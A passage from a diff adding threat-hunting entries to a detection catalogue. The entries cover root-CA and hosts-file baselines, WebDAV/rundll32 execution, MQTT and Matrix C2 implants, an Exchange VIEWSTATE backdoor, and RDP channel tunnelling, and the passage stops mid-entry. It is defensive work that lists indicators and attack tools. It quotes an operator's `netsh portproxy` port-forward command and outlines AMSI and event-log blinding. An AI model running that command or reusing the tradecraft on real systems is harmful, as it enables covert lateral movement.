@@ -1600,6 +1600,93 @@
     "created": "2026-09-21T10:51:30-05:00"
   },
   {
+    "id": "B048",
+    "category": "Embers",
+    "title": "Baseline of machine trust state: every root CA, hosts-file entry and local-proxy firewall rule in the estate",
+    "tactic": "Defense Evasion, Credential Access",
+    "notes": "Collection shape - unlike most baselines this is predominantly POINT-IN-TIME STATE rather than an accumulating event window. Collect the full inventory on day one, then re-snapshot at 30 days to produce the first diff; the event streams (Sysmon 12/13, CAPI2, Firewall 2004/2005) run continuously alongside to catch changes between snapshots and to attribute each change to a process. A baseline built only from events will miss everything installed before collection started, which on a long-lived estate is most of what matters.\nFields to collect, certificates - for every certificate in every store on every host - `thumbprint`, `subject`, `issuer`, `serial number`, `not before`, `not after`, `key usage`, `enhanced key usage`, `SAN list`, whether it is SELF-SIGNED (subject equals issuer), the store it occupies, and the host it was found on. Then compute the two derived fields that do the actual work - HOST COUNT per thumbprint across the estate, and PRESENCE IN THE MICROSOFT CERTIFICATE TRUST LIST. A self-signed root present on a small number of hosts and absent from the Microsoft CTL and absent from the organisation's own intended list is the exact shape of [[H314]].\nFields to collect, installation provenance - for every root-store write observed in the event stream - the writing process `Image`, its `ParentImage`, the user context, and the installation timestamp. Legitimate estate-wide CAs arrive via `svchost.exe` under the Group Policy service, the Intune management extension, or a named software-deployment agent. A root written by a process that is none of those - and in particular by a hollowed or unexpected binary such as `MsBuild.exe` - is a direct finding.\nFields to collect, hosts file - the full contents per host, normalised, with each entry's `hostname`, `mapped address`, whether the address is loopback, and whether the hostname is a PUBLIC REGISTRABLE DOMAIN. Diff against the organisation's standard hosts file (usually empty apart from comments). Any public domain mapped to `127.0.0.1` or `::1` is an immediate flag.\nFields to collect, firewall rules - per host, every enabled rule allowing INBOUND traffic, with `rule name`, `program path`, `direction`, `action`, `local port`, `profile`, and whether the program path resolves to a binary belonging to an installed, inventoried product. Rules whose program path sits in a user-writable directory, or that correspond to no known product, are the residual set to review.\nImmediate flags, do not wait for the 30-day re-snapshot - (1) a self-signed root present on fewer than a threshold number of hosts (set from your own distribution; single-digit host counts in a large estate) and absent from the Microsoft CTL; (2) a root whose subject impersonates a well-known public CA (Google Trust Services, DigiCert, Let's Encrypt, Microsoft) but whose chain terminates in itself; (3) any certificate whose SAN pairs a public domain with `localhost`; (4) a root-store write by a process that is not a recognised management agent; (5) a hosts-file entry mapping a public domain to loopback; (6) an inbound firewall rule whose program path is in a user-writable location.\nDeliverable - four artefacts, all diffable. (1) A TRUST REGISTER - every distinct certificate thumbprint in the estate, its host count, its disposition (public/CTL-backed, internal PKI, sanctioned inspection product, developer tool, unexplained), and a named owner for every non-public entry. (2) A PROVENANCE MAP - which management channel is expected to install each non-public CA, so that an out-of-channel write is detectable. (3) A HOSTS-FILE STANDARD plus the exception list of hosts that legitimately deviate and why. (4) A LOCAL-LISTENER REGISTER - every inbound firewall rule in the estate reconciled to a product and an owner. Re-snapshot quarterly thereafter; trust state changes slowly, which is precisely what makes the diff powerful.\n",
+    "tags": [
+      "embers",
+      "baseline",
+      "defense_evasion",
+      "credential_access",
+      "t1553_004",
+      "t1553_002",
+      "t1090_001",
+      "root_certificate",
+      "trust_store",
+      "tls_interception",
+      "hosts_file",
+      "firewall_rules",
+      "windows",
+      "T1553.004",
+      "T1553.002",
+      "T1090.001"
+    ],
+    "techniques": [
+      "T1553.004",
+      "T1553.002",
+      "T1090.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H314"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Trust state is the rare security-relevant surface that is almost perfectly stable, which makes diffing it unusually powerful.** Root stores change rarely and for a small number of knowable reasons. A dataset with that little natural churn produces very few false positives per diff, so the signal-to-noise on this baseline is far better than on behavioural baselines — and unlike most inventories, it stays accurate for months.\n- **It converts the single hardest triage question in [[H314]] into a lookup.** \"Is this CA supposed to be here?\" has no answer from the certificate itself. With host count and an intended-CA list in hand it is answered instantly, and without them an analyst is reduced to searching the subject name on the internet and guessing.\n- **The exercise finds standing exposure that no detection would ever raise.** Retired internal CAs, roots from decommissioned products, unaccounted-for inspection CAs, and long-expired-but-still-trusted certificates are all sitting in production root stores right now in most estates, each one a usable trust anchor with no owner. Only an inventory surfaces them, and each is a remediation item independent of any intrusion.\n- **It forces the PKI and network teams to state what they actually intend to distribute.** The most common finding in this exercise is not malware — it is an inspection or DLP CA that nobody can immediately account for, because the product was deployed by a team that no longer owns it. Reconciling installed trust against intended trust is valuable on its own and is the prerequisite for every certificate-related detection built afterwards.",
+    "references": "- [MITRE ATT&CK T1553.004 — Subvert Trust Controls: Install Root Certificate](https://attack.mitre.org/techniques/T1553/004/)\n- [MITRE ATT&CK T1553.002 — Subvert Trust Controls: Code Signing](https://attack.mitre.org/techniques/T1553/002/)\n- [Google Doc Sidebar Sends Mac and Windows Users Down Different Paths to Malware (Huntress)](https://www.huntress.com/blog/google-doc-sidebar-malware-mac-windows)\n- [Microsoft — Certificate Trust List and automatic root update behaviour](https://learn.microsoft.com/en-us/security/trusted-root/program-requirements)\n- [Enabling CAPI2 Operational logging for certificate store diagnostics (Ivanti)](https://hub.ivanti.com/s/article/HOWTO-Enable-CAPI2-event-logging-for-investigating-certificate-related-issues?language=en_US)\n- [Root CA Abuse as a stealth evasion technique — detection and hardening (Veil Framework)](https://www.veil-framework.com/root-ca-abuse-the-new-stealth-evasion-technique-of-2025-26/)\n- [Atomic Red Team — T1553.004 Install Root Certificate atomics](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md)",
+    "file_path": "Embers/B048.md",
+    "created": null
+  },
+  {
+    "id": "B049",
+    "category": "Embers",
+    "title": "Baseline of WebDAV and UNC execution: does the WebClient service ever start here, and which hosts are legitimately mounted",
+    "tactic": "Execution, Defense Evasion",
+    "notes": "Collection window - 30 days, which covers a full monthly cycle including patch Tuesday, month-end finance processes and any monthly scheduled jobs that mount shares. The sanctioned-platform inventory is point-in-time and should be gathered on day one from SharePoint, OneDrive and document-management owners rather than accumulated from logs.\nFields to collect, WebClient service - for every `WebClient` start across the estate - `hostname`, `timestamp`, the triggering user session, and whether the host is a workstation, server or VDI instance. Produce a per-host and per-business-unit frequency distribution. The headline number this baseline exists to produce is the PERCENTAGE OF HOSTS ON WHICH WEBCLIENT EVER STARTS. If that number is near zero, [[H313]] can use service start as a primary filter; if it is material, that condition must be dropped and replaced by destination scoping, and the baseline should say so explicitly.\nFields to collect, mount destinations - for every WebDAV mount and every UNC access - `destination host`, `share path`, `requesting user`, `requesting process`, `internal or external`, and the resolved IP. Classify each destination host as (a) internal and sanctioned, (b) internal and unexplained, or (c) external. Category (c) should be empty or nearly so in a healthy environment, and every member of it is a finding in its own right.\nFields to collect, remote-DLL execution - every process creation where `CommandLine` contains a UNC prefix and `Image` is one of `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, `msiexec.exe`, `installutil.exe` or `certutil.exe`. Record `Image`, full `CommandLine`, `ParentImage`, `ParentCommandLine`, `User`, destination host, target filename, target EXTENSION, and whether execution was by named export or by ORDINAL. Two distributions matter for tuning the Flames hunt - how often a non-`.dll` extension appears (expected - almost never) and how often ordinal invocation appears (expected - rare and confined to a few in-box operations).\nFields to collect, Run dialog usage - profile `RunMRU` values across the estate - the distinct strings, their frequency, and how many contain a command SEPARATOR (`&&`, `;`, `|`), a scripting engine, or a UNC path. This establishes what a normal Run-dialog entry looks like in this organisation, which is what makes a pasted ClickFix chain stand out later. In most estates the legitimate vocabulary is a few dozen short tokens.\nImmediate flags, do not wait for the baseline to complete - (1) any `rundll32`/`regsvr32`/`mshta` command line containing a UNC path whose destination host is EXTERNAL; (2) any remote-DLL execution where the target file has a non-`.dll` extension or is invoked by ordinal; (3) a `WebClient` service start on a domain controller, a server, or any host in a business unit with no sanctioned WebDAV workflow; (4) a `RunMRU` entry containing a multi-command chain with a scripting engine or UNC path; (5) WebDAV `PROPFIND`/`OPTIONS` traffic to a registrable domain outside the organisation, especially with randomised subdomains under one parent.\nDeliverable - four artefacts, all diffable. (1) A WEBDAV POSTURE STATEMENT - the percentage of hosts on which WebClient ever starts, the sanctioned workflows that require it, and an explicit recommendation of whether service start is usable as a detection primary in this estate. (2) A DESTINATION ALLOWLIST - every internal host legitimately mounted over UNC or WebDAV, with owning application and business owner. (3) A REMOTE-EXECUTION REGISTER - every recurring `rundll32`/`regsvr32`/`mshta`-from-UNC invocation, with its source (logon script, GPO, application) and an owner. (4) A RUN-DIALOG PROFILE - the normal RunMRU vocabulary and the threshold above which a pasted string is anomalous. Re-snapshot at the end of the window to produce the first diff.\n",
+    "tags": [
+      "embers",
+      "baseline",
+      "execution",
+      "defense_evasion",
+      "t1218_011",
+      "t1204_004",
+      "t1071",
+      "webdav",
+      "webclient",
+      "unc",
+      "rundll32",
+      "clickfix",
+      "windows",
+      "T1218.011",
+      "T1204.004",
+      "T1071"
+    ],
+    "techniques": [
+      "T1218.011",
+      "T1204.004",
+      "T1071"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H313",
+      "M044"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **It decides the detection posture rather than merely tuning it.** This is not a threshold to adjust; it is a binary architectural choice between two different hunts. Either WebClient start is a primary filter or destination classification is, and running the Flames hunt without having made that choice deliberately produces either an alert flood or a silently ineffective query.\n- **External UNC destinations are the durable discriminator and they are directly enumerable.** Legitimate WebDAV and remote-DLL activity is overwhelmingly internal, to hosts in the organisation's own namespace. Building the internal allowlist once means every future hit can be judged on destination alone — a property that survives the campaign's filenames, domains and ordinals rotating, because the internal-versus-external distinction is a fact about the organisation rather than about the malware.\n- **It surfaces standing exposure that no alert would ever raise.** Forgotten WebDAV intranets, legacy document workflows and vendor clients that mount shares are all discovered by this exercise and by nothing else. Each is both a tuning input and a risk item with an owner, so the baseline pays for itself even if the associated threat never materialises.\n- **The Run-dialog profile is the piece nobody has and ClickFix depends on.** ClickFix, and the whole family of paste-the-command lures, requires a human to enter a long command into the Run dialog. `RunMRU` records it, the legitimate vocabulary in any organisation is a few dozen short tokens, and knowing that vocabulary is what turns a pasted chain from an unremarkable registry value into an obvious outlier.",
+    "references": "- [MITRE ATT&CK T1218.011 — System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011/)\n- [MITRE ATT&CK T1204.004 — User Execution: Malicious Copy and Paste](https://attack.mitre.org/techniques/T1204/004/)\n- [ClearFake WebDAV infection chain delivers Amatera stealer (Cisco Talos)](https://blog.talosintelligence.com/clearfake-webdav-infection-chain/)\n- [SigmaHQ — Rundll32 UNC Path Execution (`proc_creation_win_rundll32_unc_path.yml`)](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_unc_path.yml)\n- [Everything We Know About CVE-2023-23397 — WebDAV, WebClient and rundll32 behaviour in practice (Huntress)](https://www.huntress.com/blog/everything-we-know-about-cve-2023-23397)\n- [Microsoft — WebClient service and WebDAV redirector overview](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview)",
+    "file_path": "Embers/B049.md",
+    "created": null
+  },
+  {
     "id": "H001",
     "category": "Flames",
     "title": "An adversary is attempting to brute force the admin account on the externally facing VPN gateway.",
@@ -11670,6 +11757,414 @@
     "created": "2026-09-21T10:51:30-05:00"
   },
   {
+    "id": "H309",
+    "category": "Flames",
+    "title": "Windows service masquerading as a Control Panel component beaconing to a public MQTT broker on TCP 8883",
+    "tactic": "Command and Control, Persistence, Defense Evasion",
+    "notes": "Core filter, network - Sysmon Event ID 3 or `DeviceNetworkEvents` where `DestinationPort` is 8883 (MQTT over TLS) or 1883 (plaintext MQTT), and `DestinationHostname` resolves to a public broker service - `broker.hivemq.com`, `broker.emqx.io`, `test.mosquitto.org`, `broker.mqttdashboard.com`. Join on `Image` and discard any initiating process that is a browser, an interpreter run interactively, or a known OT gateway binary. Reported campaign infrastructure - `broker.hivemq.com:8883` for the MQTT build, with the implant also calling `ip-api.com` for external-IP discovery on first run, which is a useful corroborating second connection from the same `Image`.\nCore filter, host - Sysmon Event ID 1 or `DeviceProcessEvents` for a process whose `Image` sits directly under a `%PROGRAMDATA%\\<vendorish-name>\\` directory and whose parent is `services.exe`. Reported binaries were `cplsupport.exe` (MD5 `BFADBEEE63A4F0BF19EC9DEB8FA58F58`) and `wtass.exe` (MD5 `7916C33688385525078BEE504C90F359`), installed with an `--install` or `install` argument on first execution - that installer invocation is itself a high-value process-creation hit because the service binary is run interactively exactly once, by whatever delivered it. Check `Company` and `Product` version resources: the implant impersonates Microsoft components by service display name only, and the binary metadata is usually blank or inconsistent with the claimed identity.\nCore filter, configuration artefacts - Sysmon Event ID 11 for `config.toml` created under `%PROGRAMDATA%\\cplsupport\\` or `%PROGRAMDATA%\\SynapseAgent\\`, and Sysmon Event ID 13 for a value written to `HKLM\\Software\\synapse\\Config\\SealedConfig` or `HKLM\\Software\\SynapseAgent\\metrics_interval`. The sealed configuration is encrypted with ChaCha20-Poly1305 under a key derived from `HKLM\\Software\\Microsoft\\Cryptography\\MachineGuid`, so it is machine-bound and will not decrypt off-host - collect the raw value during triage rather than expecting to read it later from a copy. A plaintext `config.toml` on disk alongside a sealed registry copy means you caught the implant between first run and self-sealing, which is the best possible evidence state.\nService registration - System event 7045 or Security event 4697 where `ServiceName` is a short lowercase token (`cplsupport`, `wtas`) but the display name claims a Microsoft Control Panel or telemetry role, and `ImagePath` points under `%PROGRAMDATA%` rather than `%SystemRoot%\\System32`. No genuine in-box Windows service runs from `%PROGRAMDATA%`; that single condition is worth a standing detection independent of this campaign.\nDelivery pivot - Reported delivery was over WinRM using Evil-WinRM and WinRM-fs, so pivot backwards from any hit to Microsoft-Windows-WinRM/Operational and Security event 4624 logon type 3 with `wsmprovhost.exe` as a process ancestor, on the same host in the preceding hour. See [[B037]] for the WinRM baseline that makes that pivot answerable.\nTriage values - `Image`, `ImagePath`, `ServiceName`, service display name, `DestinationHostname`, `DestinationPort`, `MachineGuid`, the `config.toml` path, and the `SealedConfig` value size.\n",
+    "tags": [
+      "command_and_control",
+      "persistence",
+      "defense_evasion",
+      "t1102",
+      "t1071",
+      "t1543_003",
+      "t1036_004",
+      "mqtt",
+      "hivemq",
+      "toy_ghouls",
+      "rust_implant",
+      "public_broker",
+      "windows",
+      "T1102",
+      "T1071",
+      "T1543.003",
+      "T1036.004"
+    ],
+    "techniques": [
+      "T1102",
+      "T1071",
+      "T1543.003",
+      "T1036.004"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H310",
+      "M036"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **It defeats the reputation layer by construction, not by evasion.** Nothing about `broker.hivemq.com` is suspicious and nothing needs to be — the adversary registered no domain, bought no certificate and stood up no server, so newly-observed-domain, NRD, DGA and certificate-age controls have nothing to score. Detection has to move to the endpoint and to the port, because the destination will never look wrong.\n- **Port 8883 is a near-perfect discriminator in a normal enterprise.** MQTT's TLS port is IANA-registered and unambiguous, and the legitimate population that speaks it — OT gateways, building management, IoT concentrators — is small, static and knowable. A workstation, file server or domain controller opening 8883 is outside that population by definition, which turns a protocol port into a high-signal filter rather than a noisy one.\n- **The persistence shape is self-incriminating independent of this campaign.** No in-box Windows service runs its binary from `%PROGRAMDATA%`. A service registration (7045/4697) whose `ImagePath` resolves there, while its display name claims to be a Control Panel or telemetry component, is worth hunting on its own merits and will survive every IOC rotation in this cluster.\n- **The configuration artefacts give triage a decisive answer.** The implant writes `config.toml` on first run and then seals it into the registry under a key bound to `MachineGuid` — so the presence of both a plaintext TOML beside a service binary and an opaque `SealedConfig` blob is not something a responder has to interpret. It is either the implant mid-installation or it is not, and the machine-bound key means the evidence cannot be reconstructed from a copy taken off-host.",
+    "references": "- [MITRE ATT&CK T1102 — Web Service](https://attack.mitre.org/techniques/T1102/)\n- [MITRE ATT&CK T1071 — Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)\n- [MITRE ATT&CK T1543.003 — Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)\n- [MITRE ATT&CK T1036.004 — Masquerading: Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004/)\n- [Angry Birds: Toy Ghouls' new toys (Securelist / Kaspersky)](https://securelist.com/toy-ghouls-new-hivemq-and-element-backdoors/121270/)\n- [Atomic Red Team — T1543.003 Windows Service atomics](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md)\n- [HiveMQ public MQTT broker (the service being abused as C2)](https://www.hivemq.com/mqtt/public-mqtt-broker/)",
+    "file_path": "Flames/H309.md",
+    "created": null
+  },
+  {
+    "id": "H310",
+    "category": "Flames",
+    "title": "Matrix homeserver used as bidirectional C2, with commands arriving as chat events from a bot account",
+    "tactic": "Command and Control, Persistence, Defense Evasion",
+    "notes": "Core filter, network - Sysmon Event ID 22 or `DeviceNetworkEvents` for DNS queries and connections to Matrix homeservers from a process that is not the sanctioned chat client. Where proxy or TLS inspection provides URI visibility, the protocol is unmistakable: Matrix clients poll `/_matrix/client/v3/sync` on a long-poll loop and publish with `PUT /_matrix/client/v3/rooms/{roomId}/send/{eventType}/{txnId}`. A long-poll `sync` loop from a service process is the single highest-fidelity network artefact here, because it produces a distinctive steady request cadence with long server-held connections that looks nothing like ordinary web browsing. Reported campaign infrastructure - `meet.element[.]tw`, a brand-lookalike homeserver; the operator account issuing commands was `panel-bot`.\nCustom event types as the content discriminator - the implant does not use standard `m.room.message` events. It defines its own: `m.bird.status`, `m.bird.metrics` and `m.bird.cmd_response`. Where the Matrix event type is visible - decrypted proxy traffic, or a homeserver you operate and can query - a non-standard `m.*` event type prefix outside the documented Matrix event vocabulary is a direct hit. On an organisation-run homeserver, enumerate the distinct event types present in room history and in the `panel-bot`-equivalent account's sent events; the vocabulary is small and any custom namespace stands out immediately.\nCore filter, host - Sysmon Event ID 1 or `DeviceProcessEvents` for a process parented by `services.exe` whose `Image` is under `%PROGRAMDATA%\\SynapseAgent\\` or a similar vendorish directory, correlated with Sysmon Event ID 13 writes to `HKLM\\Software\\synapse\\Config\\SealedConfig` and `HKLM\\Software\\SynapseAgent\\metrics_interval`. The configuration is ChaCha20-Poly1305 sealed under a key derived from `HKLM\\Software\\Microsoft\\Cryptography\\MachineGuid`, exactly as in the MQTT sibling [[H309]] - the two variants share host tradecraft and differ only in transport, so a hit on either half should trigger a sweep for the other.\nService registration - System event 7045 / Security event 4697 where `ImagePath` resolves under `%PROGRAMDATA%` while the display name claims a Microsoft role. Reported service names in this cluster were `cplsupport` (\"Problem Reports Control Panel\") and `wtas` (\"Windows Telemetry Aggregator Service\"), but treat those as perishable and hunt the shape.\nScoping the population - build the answer to \"who is allowed to run a chat client\" before running this. If the organisation has no Matrix deployment, alert on any client-server API traffic. If it does, allowlist by the exact homeserver hostnames operated by the organisation plus the signed client image path, and alert on everything else - in particular any Matrix traffic whose initiating process is a Windows service.\nTriage values - `Image`, `ImagePath`, `ServiceName`, `QueryName`, `DestinationHostname`, homeserver hostname, Matrix event type, and the `SealedConfig` value size.\n",
+    "tags": [
+      "command_and_control",
+      "persistence",
+      "defense_evasion",
+      "t1102_002",
+      "t1543_003",
+      "t1036_004",
+      "matrix",
+      "element",
+      "toy_ghouls",
+      "bidirectional_communication",
+      "rust_implant",
+      "windows",
+      "T1102.002",
+      "T1543.003",
+      "T1036.004"
+    ],
+    "techniques": [
+      "T1102.002",
+      "T1543.003",
+      "T1036.004"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H309",
+      "M036"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Bidirectional legitimate-service C2 removes the beacon.** Classic C2 detection leans on a client repeatedly calling a destination that exists only to receive it. Here the destination is a real chat server serving real protocol traffic, and the implant's polling is indistinguishable in shape from a chat client keeping a room in sync — because that is precisely what it is doing. Volumetric beacon-interval analysis is the wrong instrument; process identity is the right one.\n- **The brand-lookalike homeserver defeats allowlist-by-substring.** `meet.element[.]tw` reads as Element infrastructure and is not. Any control that permits collaboration tooling by matching vendor names in hostnames will pass this traffic, which makes the specific-homeserver allowlist — rather than the brand allowlist — the only defensible configuration, and this hunt is what surfaces the gap.\n- **A Windows service has no reason to hold a chat session.** The implant's one irreducible contradiction is that `services.exe` started a process that behaves like an interactive collaboration client. No legitimate deployment of Element or any other Matrix client runs as a non-interactive system service, so the join between service parentage and client-server API traffic is close to a zero-false-positive condition.\n- **Custom event types are a content-level fingerprint that survives infrastructure rotation.** The `m.bird.*` namespace is invented and sits outside the documented Matrix event vocabulary. Where an organisation runs its own homeserver — or can decrypt proxy traffic — enumerating distinct event types is cheap, the legitimate vocabulary is small, and an unknown custom namespace is a direct hit regardless of which homeserver or operator account the campaign moves to next.",
+    "references": "- [MITRE ATT&CK T1102.002 — Web Service: Bidirectional Communication](https://attack.mitre.org/techniques/T1102/002/)\n- [MITRE ATT&CK T1543.003 — Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)\n- [MITRE ATT&CK T1036.004 — Masquerading: Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004/)\n- [Angry Birds: Toy Ghouls' new toys (Securelist / Kaspersky)](https://securelist.com/toy-ghouls-new-hivemq-and-element-backdoors/121270/)\n- [Matrix Client-Server API specification (the `/_matrix/client/` routes and event-type vocabulary)](https://spec.matrix.org/latest/client-server-api/)\n- [Matrix room event format and the `m.*` event-type vocabulary](https://spec.matrix.org/latest/client-server-api/#room-event-format)\n- [Elastic prebuilt detection rules — command-and-control coverage](https://www.elastic.co/guide/en/security/current/prebuilt-rules.html)",
+    "file_path": "Flames/H310.md",
+    "created": null
+  },
+  {
+    "id": "H311",
+    "category": "Flames",
+    "title": "Exchange backdoor launched from a forged VIEWSTATE and commanded through the x-owa-urlpostdata header",
+    "tactic": "Persistence, Command and Control, Defense Evasion",
+    "notes": "Core filter, the header - search IIS request logs, WAF logs or reverse-proxy logs for requests carrying the header name `x-owa-urlpostdata`. This is the single highest-fidelity artefact in the chain and the one to stand up as a permanent detection. Note the prerequisite - stock IIS W3C logging records a fixed field set and does NOT capture arbitrary request headers, so this requires IIS Advanced Logging, a custom field configuration, or capture at the WAF/reverse proxy. If no telemetry records request header names on the Exchange path, treat closing that gap as the first output of this hunt.\nCore filter, the response marker - each command execution returns an XML-formatted response whose value element begins with the hardcoded string `/wEPDwUKLTcyODc4`. This string is inherited from the public `ExchangeCmdPy.py` CVE-2020-0688 tooling. Where response bodies are retained or inspectable, grep for it directly; it is a literal, fixed, high-confidence indicator.\nCore filter, the VIEWSTATE submission - in IIS logs, look for `POST` requests to OWA/ECP endpoints with unusually large `cs-bytes` relative to that endpoint's own baseline, especially where `cs-uri-query` or the body carries `__VIEWSTATE`. Pair with ASP.NET application event log entries for ViewState MAC validation failure (Event ID 1316 / `System.Web.HttpException` \"Validation of viewstate MAC failed\"), which is what a forged ViewState produces once keys no longer match. Cluster failures by `c-ip` - attack traffic concentrates on one or a few source addresses against a narrow endpoint set, while benign farm-mismatch failures spread across many users.\nIn-memory loading and evasion - Sysmon Event ID 7 / `DeviceImageLoadEvents` for .NET assemblies loaded into `w3wp.exe` that are not backed by a file on disk or that sit outside the ASP.NET temporary compilation directories. The reported implant was cloaked under the assembly name `App_Web_Container_1.dll`, with internal classes `Stub`, `App_Web_843e75cf5b63` (virtual path redirection) and `App_Web_8c9b251fb5b3` (traffic proxying). The `Stub` class patches `amsi.dll` and `ntdll.dll` in memory to blind AMSI and the Windows Event Log, so a sudden cessation of ETW/event-log output from `w3wp.exe` on a server that is still serving traffic is a corroborating anomaly in its own right - hunt for the SILENCE, not only for the write.\nImpersonation behaviour - the implant checks whether it is running as a system account and, if not, impersonates a user via a token held in the application domain's data store. Correlate Security event 4624 logon type 9 (NewCredentials) and 4648 (explicit credential logon) originating from `w3wp.exe` on Exchange hosts.\nRemediation pivot that doubles as scoping - because the entry point is the stolen `machineKey`, patching does not evict the actor. Inventory `validationKey` and `decryptionKey` across every Exchange server and record the last rotation date; any server whose keys predate a suspected compromise is still exposed regardless of patch level, and rotating them is what actually closes the door.\nTriage values - `c-ip`, `cs-username`, `cs-uri-stem`, `cs-bytes`, `sc-status`, `cs(User-Agent)`, request header names, and the loading module list for `w3wp.exe`.\n",
+    "tags": [
+      "persistence",
+      "command_and_control",
+      "defense_evasion",
+      "t1505_003",
+      "t1102",
+      "t1027",
+      "t1685",
+      "exchange",
+      "viewstate",
+      "ghostcontainer",
+      "nighteagle",
+      "machinekey",
+      "amsi_bypass",
+      "windows",
+      "T1505.003",
+      "T1102",
+      "T1027",
+      "T1685"
+    ],
+    "techniques": [
+      "T1505.003",
+      "T1102",
+      "T1027",
+      "T1685"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [
+      "H312"
+    ],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Passive backdoors invert the usual detection strategy and most stacks are not configured for it.** Every control premised on finding outbound C2 — beacon analysis, DNS reputation, egress anomaly detection — has nothing to score against an implant that only ever answers inbound requests. The evidence exists only in inbound web telemetry, which is exactly the telemetry most Exchange deployments log least carefully.\n- **The header name is a literal, durable, zero-ambiguity indicator, and hunting for it audits the logging gap.** Legitimate OWA clients never send `x-owa-urlpostdata`. The catch is that default IIS W3C logging cannot record arbitrary header names at all, so a clean result is usually a statement about collection rather than about compromise — which makes this hunt valuable even when it finds nothing, because it forces that gap into the open.\n- **Stolen machine keys survive patching, so the exposure window is defined by key rotation, not by update status.** An organisation that patched Exchange but never rotated `validationKey`/`decryptionKey` after a suspected intrusion remains trivially re-exploitable by anyone holding the old keys. Inventorying key age across the Exchange estate converts an unanswerable question into a list.\n- **Deliberate blinding leaves its own signature.** The implant patches AMSI and the event log in-process, so the absence of expected ETW and Defender telemetry from a `w3wp.exe` that is demonstrably still serving requests is itself anomalous. Hunting for the silence catches the technique even when every positive indicator has been rotated away.",
+    "references": "- [MITRE ATT&CK T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)\n- [MITRE ATT&CK T1102 — Web Service](https://attack.mitre.org/techniques/T1102/)\n- [MITRE ATT&CK T1685 — Disable or Modify Tools](https://attack.mitre.org/techniques/T1685/)\n- [NightEagle APT targets Russian organizations (Securelist / Kaspersky)](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)\n- [GhostContainer backdoor for Exchange servers — original analysis (Securelist / Kaspersky)](https://securelist.com/ghostcontainer/116953/)\n- [Microsoft — Configure machine keys in ASP.NET (`validationKey` / `decryptionKey` rotation)](https://learn.microsoft.com/en-us/aspnet/whitepapers/aspnet4/breaking-changes)\n- [Atomic Red Team — T1505.003 Web Shell atomics](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.003/T1505.003.md)",
+    "file_path": "Flames/H311.md",
+    "created": null
+  },
+  {
+    "id": "H312",
+    "category": "Flames",
+    "title": "TCP tunnelled inside an RDP virtual channel, visible as a non-standard channel name in RdpCoreTS 132/148",
+    "tactic": "Command and Control, Lateral Movement, Defense Evasion",
+    "notes": "Core filter - query `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` for `EventID in (132, 148)`, parse the channel name out of the message, and allowlist the known RemoteFX/RDS vocabulary plus the vendor channels enumerated in your environment. Alert on the remainder. Event 132 reads in the form \"A channel <NAME> has been connected between the server and the client using transport tunnel: N\" and 148 is the matching close (\"Channel <NAME> has been closed between the server and the client on transport tunnel: N\"); in the ETW manifest 148 is `RemoteFXmodule_4CloseConnection148` and shares 132's template, so the same field parser works for both. The literal string `rdp2tcp` is a direct hit; high-entropy alphanumeric names are the evasion variant and are what the allowlist catches.\nSession correlation - join each anomalous 132/148 to its session using events 98 and 131 from the same log (TCP acceptance and establishment, several 131s per 98), then to Security 4624 logon type 10 and TerminalServices-LocalSessionManager 21/25 to recover the account name and source IP. Triage questions that resolve most hits - is this a VDI host where the channel is a product feature, or a server where somebody brought their own tooling; was the session interactive at a plausible hour; did the source address appear anywhere else in the estate.\nTunnel server component on the target - Sysmon Event ID 1 for an unsigned or newly-written binary executing inside the RDP session, and Sysmon Event ID 3 for that process binding or connecting to `127.0.0.1` on non-standard ports. A port-forward implemented over a virtual channel still has to terminate somewhere locally, so the loopback forwards are visible on the host even though nothing crosses the perimeter.\nPaired tradecraft to pivot on - this actor reached the RDP session itself through Microsoft dev tunnels, exposing TCP 3389 via `*.devtunnels.ms` rather than through an inbound firewall rule. Hunt that as a companion condition in DNS and proxy logs, since it is the half that crosses the perimeter and it rides a legitimate Microsoft service. Also correlate `netsh interface portproxy add v4tov4` executions (reported example - `netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445`), which is the cruder sibling technique the same operators used, and Kerberos/DCSync follow-on activity per the same reporting.\nTelemetry prerequisite - the RdpCoreTS operational log is on by default but is very rarely forwarded to the SIEM. Verify it is being collected from servers and jump hosts before interpreting an empty result; if it is not, standing up that collection is the first deliverable of this hunt.\nTriage values - channel name, transport tunnel number, `EventID`, event timestamp, session ID, account name, source IP, and the process list observed inside the session.\n",
+    "tags": [
+      "command_and_control",
+      "lateral_movement",
+      "defense_evasion",
+      "t1572",
+      "t1021_001",
+      "t1090_001",
+      "rdp",
+      "rdp2tcp",
+      "virtual_channel",
+      "protocol_tunneling",
+      "nighteagle",
+      "windows",
+      "T1572",
+      "T1021.001",
+      "T1090.001"
